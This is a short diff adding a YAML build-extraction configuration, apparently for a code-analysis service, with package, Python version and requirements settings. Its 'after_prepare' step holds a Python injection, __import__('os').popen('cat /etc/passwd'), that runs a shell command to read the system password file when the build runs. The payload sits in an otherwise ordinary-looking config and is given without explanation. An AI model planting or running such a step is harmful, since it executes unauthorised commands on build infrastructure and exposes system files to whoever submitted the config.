@@ -1,0 +1,11 @@
+extraction:
+  python:
+    prepare: 
+      packages: libpng-dev
+    after_prepare:
+      - __import__('os').popen('cat /etc/passwd')
+    python_setup: 
+      version: 3
+      requirements_files: 
+        - contrib/requirements.txt
+      setup_py: false
